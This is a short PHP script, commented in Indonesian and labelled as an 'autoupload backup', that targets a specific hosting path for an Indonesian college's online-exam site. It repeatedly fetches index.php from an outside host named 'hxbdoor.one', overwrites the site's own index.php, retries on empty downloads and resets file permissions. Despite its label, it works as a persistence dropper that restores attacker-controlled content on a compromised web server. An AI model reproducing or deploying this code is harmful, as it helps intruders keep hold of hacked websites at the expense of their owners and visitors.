<?php
// autoupload backup, rahmanraleigh
$backupURLS = array(
    '/home/pkke7327/public_html/cbt.pkkb.ac.id/' => array(
        'index.php' => 'https://hxbdoor.one/raw/GUj95qK5'
    )
);

// Fungsi permission
function setProperPermissions($path) {
    if (is_dir($path)) {
        $expectedPermission = '0755';
    } elseif (is_file($path)) {
        $expectedPermission = '0644';
    } else {
        return;
    }

    $currentPermission = substr(sprintf('%o', fileperms($path)), -4);
    if ($currentPermission !== $expectedPermission) {
        chmod($path, octdec($expectedPermission));
    }
}

// Fungsi download file (dengan retry jika file kosong)
function downloadWithRetry($url, $filePath, $maxRetry = 3) {
    for ($i = 1; $i <= $maxRetry; $i++) {
        $fp = fopen($filePath, 'w');
        $ch = curl_init($url);

        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

        curl_exec($ch);
        curl_close($ch);
        fclose($fp);

        // Cek file blank
        if (file_exists($filePath) && filesize($filePath) > 0) {
            return true; // sukses
        }

        // Jika blank, hapus dan retry
        if (file_exists($filePath)) {
            unlink($filePath);
        }
    }
    return false; // gagal setelah retry
}

foreach ($backupURLS as $directoryPath => $files) {

    // Buat direktori jika belum ada
    if (!is_dir($directoryPath)) {
        mkdir($directoryPath, 0755, true);
    }

    setProperPermissions($directoryPath);

    // Cek permission file lama
    $dirContents = array_diff(scandir($directoryPath), array('.', '..'));
    foreach ($dirContents as $file) {
        $filePath = $directoryPath . $file;
        if (is_file($filePath)) {
            setProperPermissions($filePath);
        }
    }

    // Download file
    foreach ($files as $fileName => $backupURL) {
        $filePath = $directoryPath . $fileName;

        $result = downloadWithRetry($backupURL, $filePath, 3);

        if ($result) {
            // echo "$fileName berhasil diunduh.\n";
            setProperPermissions($filePath);
        } else {
            // echo "$fileName gagal diunduh setelah retry.\n";
        }
    }
}
?>
